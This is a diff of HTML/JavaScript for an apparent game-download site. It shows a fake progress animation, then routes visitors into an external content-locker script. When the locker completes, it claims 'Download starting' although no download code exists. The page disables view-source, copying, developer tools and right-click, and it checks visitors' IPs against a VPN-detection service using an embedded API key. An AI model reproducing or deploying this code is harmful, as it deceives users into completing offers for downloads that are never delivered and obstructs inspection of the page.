+    var BpTOv_OlD_FohMac={"it":4503021,"key":"214a8"};
+</script>
+<script src="https://dlk457skl57zp.cloudfront.net/c8a8de2.js"></script>
+
+<script>
+    let currentPopup = null;
+
+    function showPopup(gameName, imageUrl) {
+        if (currentPopup) {
+            document.body.removeChild(currentPopup);
+        }
+        
+        const popup = document.createElement('div');
+        popup.className = 'popup';
+        popup.innerHTML = `
+            <div class="popup-content">
+                <h2>Downloading <span class="popup-game-title">${gameName}</span></h2>
+                <img src="${imageUrl}" alt="${gameName}" 
+                     style="width: 100px; height: 100px; border-radius: 12px;">
+                <div class="circle-container">
+                    <svg class="circle-progress" viewBox="0 0 100 100">
+                        <circle class="circle-progress-background" cx="50" cy="50" r="45"/>
+                        <circle class="circle-progress-bar" cx="50" cy="50" r="45"/>
+                    </svg>
+                    <div class="progress-text">0%</div>
+                </div>
+                <button class="verify-button">Download</button>
+            </div>
+        `;
+        document.body.appendChild(popup);
+        currentPopup = popup;
+        
+        setTimeout(() => popup.classList.add('active'), 10);
+        
+        const progressBar = popup.querySelector('.circle-progress-bar');
+        const progressText = popup.querySelector('.progress-text');
+        const verifyButton = popup.querySelector('.verify-button');
+        const circumference = 2 * Math.PI * 45;
+        
+        progressBar.style.strokeDasharray = circumference;
+        
+        // إعدادات التوقيت الجديدة
+        const duration = 4000; // 4 ثواني
+        const startTime = Date.now();
+        let progress = 0;
+        
+        const updateProgress = () => {
+            const elapsed = Date.now() - startTime;
+            progress = Math.min(elapsed / duration * 100, 100);
+            
+            // تحديث اللون
+            const hue = 30 + (120 - 30) * (progress / 100); // من برتقالي (30) إلى أخضر (120)
+            progressBar.style.stroke = `hsl(${hue}, 100%, 45%)`;
+            
+            // تحديث الشريط
+            const offset = circumference - (progress / 100 * circumference);
+            progressBar.style.strokeDashoffset = offset;
+            progressText.textContent = `${Math.floor(progress)}%`;
+            
+            if(progress < 100) {
+                requestAnimationFrame(updateProgress);
+            } else {
+                verifyButton.classList.add('visible');
+            }
+        };
+        
+        requestAnimationFrame(updateProgress);
+
+        verifyButton.addEventListener('click', (e) => {
+            e.stopPropagation();
+            showContentLocker(popup);
+        });
+
+        popup.addEventListener('click', (e) => {
+            if(e.target === popup) {
+                popup.classList.remove('active');
+                setTimeout(() => {
+                    document.body.removeChild(popup);
+                    currentPopup = null;
+                }, 300);
+            }
+        });
+    }
+
+    function showContentLocker(popupElement) {
+        if(typeof _uG === 'function') {
+            const locker = document.getElementById('adbluemedia-locker');
+            locker.style.display = 'block';
+            
+            _uG({
+                container: '#adbluemedia-locker',
+                callback: () => {
+                    locker.style.display = 'none';
+                    if (popupElement) {
+                        popupElement.classList.remove('active');
+                        setTimeout(() => {
+                            document.body.removeChild(popupElement);
+                            currentPopup = null;
+                        }, 300);
+                    }
+                    alert('Verification successful! Download starting...');
+                }
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        document.querySelectorAll('.game-item').forEach(item => {
+            item.addEventListener('click', function() {
+                const gameName = this.querySelector('.game-name').textContent;
+                const imageUrl = this.querySelector('img').src;
+                showPopup(gameName, imageUrl);
+            });
+        });
+    });
+    
+    
+    const toggleButton = document.getElementById("darkModeToggle");
+    toggleButton.addEventListener("click", () => {
+        document.body.classList.toggle("dark-mode");
+        const isDark = document.body.classList.contains("dark-mode");
+        localStorage.setItem("darkMode", isDark ? "enabled" : "disabled");
+        toggleButton.textContent = isDark ? "☀️" : "🌙";
+    });
+
+    // حفظ الوضع الداكن عند إعادة تحميل الصفحة
+    window.onload = () => {
+        if (localStorage.getItem("darkMode") === "enabled") {
+            document.body.classList.add("dark-mode");
+            toggleButton.textContent = "☀️";
+        }
+    };
+    
+    
+    
+    document.getElementById("searchInput").addEventListener("input", function() {
+        let filter = this.value.toLowerCase();
+        let games = document.querySelectorAll(".game-item");
+
+        games.forEach(game => {
+            let gameName = game.querySelector(".game-name").textContent.toLowerCase();
+            if (gameName.includes(filter)) {
+                game.style.display = "flex"; // إظهار اللعبة
+            } else {
+                game.style.display = "none"; // إخفاء اللعبة
+            }
+        });
+    });
+
+
+
+    function adjustFooter() {
+        const footer = document.querySelector("footer");
+        const isKeyboardOpen = window.innerHeight < screen.height * 0.75; // إذا تغير الارتفاع بشكل كبير
+
+        if (isKeyboardOpen) {
+            footer.style.transform = "translateY(100%)"; // إخفاء الفوتر عند فتح لوحة المفاتيح
+        } else {
+            footer.style.transform = "translateY(0)"; // إعادة الفوتر إلى مكانه عند إغلاق لوحة المفاتيح
+        }
+    }
+
+    window.addEventListener("resize", adjustFooter);
+    
+    
+document.getElementById("searchIcon").addEventListener("click", function() {
+    const searchInput = document.getElementById("searchInput");
+    const searchIcon = document.getElementById("searchIcon");
+
+    // عند الضغط على الأيقونة، أظهر حقل البحث
+    searchInput.classList.toggle("show");
+    
+    // إضافة أو إزالة الفئة "active" لتغيير شكل الأيقونة
+    searchIcon.classList.toggle("active");
+
+    // وضع التركيز على حقل البحث بعد أن يظهر
+    if (searchInput.classList.contains("show")) {
+        searchInput.focus();
+    }
+});
+    
+    
+    document.addEventListener('keydown', function (e) {
+    // تعطيل Ctrl + U لعرض المصدر
+    if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+    }
+    
+    // تعطيل Ctrl + C لنسخ المحتوى
+    if (e.ctrlKey && e.key === 'c') {
+        e.preventDefault();
+    }
+    
+    // تعطيل F12 (أداة المطورين)
+    if (e.keyCode === 123) {
+        e.preventDefault();
+    }
+});
+
+
+
+    document.addEventListener('contextmenu', function (e) {
+    e.preventDefault(); // تعطيل قائمة السياق (زر الماوس الأيمن)
+});
+    
+ 
+function handleIPHubResponse(data) {
+    if (data.block === 2) {
+        window.location.href = 'https://YOUR-BLOG.com/blocked';
+    }
+}
+
+function checkVPN() {
+    const script = document.createElement('script');
+    script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
+    document.head.appendChild(script);
+}
+
+function getIP(ipData) {
+    const script = document.createElement('script');
+    script.src = `https://iphub.info/api.php?ip=${ipData.ip}&key=MjgxMzk6TUVrRGVSN0ttVzdTdkxBclVrOHBXN0xXWnhPRzFDWWc=&format=jsonp&callback=handleIPHubResponse`;
+    document.head.appendChild(script);
+}
+
+checkVPN();
+  
+ 
+    
+    
+    
+</script>
+</script>
 </body>
 </html>
